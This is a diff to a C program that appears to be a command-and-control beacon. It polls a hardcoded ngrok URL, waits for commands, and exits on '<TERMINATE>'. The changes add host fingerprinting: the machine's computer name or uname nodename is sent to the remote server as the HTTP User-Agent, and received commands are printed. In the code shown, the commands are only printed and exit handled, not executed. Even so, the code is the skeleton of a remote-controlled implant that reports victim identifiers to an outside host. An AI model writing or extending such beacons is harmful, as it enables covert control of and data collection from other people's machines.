@@ -12,7 +12,9 @@
 #define PORT INTERNET_DEFAULT_HTTPS_PORT
 
 #else
+#include <sys/utsname.h>
 #include <curl/curl.h>
+
 #define URL "https://allegedly-great-shiner.ngrok-free.app"
 
 static inline void Sleep(unsigned int ms){sleep(ms / 1000);}
@@ -26,32 +28,42 @@ struct memory {
 };
 
 void parse_response(char *command);
+char *get_uname(int size_);
 
 int main(){
 	struct memory response = {0};
 
 #ifdef _WIN32
-    HINTERNET hSession = WinHttpOpen(
-        L"BN-Agent/1.0",
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS,
-        0
-    );
-    if (!hSession) {
-        fprintf(stderr, "WinHttpOpen failed\n");
-        return 1;
-    }
-    HINTERNET hConnect = WinHttpConnect(
-        hSession,
-        HOST,
-        PORT,
-        0
-    );
-    if (!hConnect) {
-        fprintf(stderr, "WinHttpConnect failed\n");
-        return 1;
-    }
+	char *user_agent = get_uname(25);
+	int len = MultiByteToWideChar(CP_UTF8, 0, user_agent, -1, NULL, 0);
+	wchar_t *new_ua = malloc(len * sizeof(wchar_t));
+	if (!new_ua || len == 0){
+		fprintf(stderr, "unable to get uname\n");
+		exit(1);
+	}
+	MultiByteToWideChar(CP_UTF8, 0, user_agent, -1, new_ua, len);
+	HINTERNET hSession = WinHttpOpen(
+		new_ua,
+		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS,
+		0
+	);
+	free(new_ua);
+	if (!hSession) {
+		fprintf(stderr, "WinHttpOpen failed\n");
+		return 1;
+	}
+	HINTERNET hConnect = WinHttpConnect(
+		hSession,
+		HOST,
+		PORT,
+		0
+	);
+	if (!hConnect) {
+		fprintf(stderr, "WinHttpConnect failed\n");
+		return 1;
+	}
 #else
 	CURL *curl;
 	CURLcode status_code;
@@ -60,6 +72,7 @@ int main(){
 		fprintf(stderr, "curl init failed\n");
 		return 1;
 	}
+	curl_easy_setopt(curl, CURLOPT_USERAGENT, get_uname(25));
 	curl_easy_setopt(curl, CURLOPT_URL, URL);
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
 	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
@@ -154,8 +167,32 @@ size_t callback(char *buffer, size_t itemsize, size_t nitems, void *userdata){
 }
 #endif
 
+char *get_uname(int size_){
+	char *u_name = (char *)malloc(sizeof(char) * size_);
+#ifdef _WIN32
+	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+	DWORD size = sizeof(computerName) / sizeof(computerName[0]);
+
+	if (GetComputerName(computerName, &size)) {
+		strncpy(u_name, computerName, size_);
+	} else {
+		printf("Failed to get system name on Windows.\n");
+	}
+#else
+	struct utsname name;
+	if (uname(&name) != -1) {
+		strncpy(u_name, name.nodename, size_);
+	} else {
+		perror("uname failed on Linux/POSIX");
+	}
+#endif
+	return u_name;
+}
+
 void parse_response(char *command){
 	if (strcmp(command, "<TERMINATE>") == 0){
 		exit(0);
+	} else {
+		printf("%s\n", command);
 	}
 }
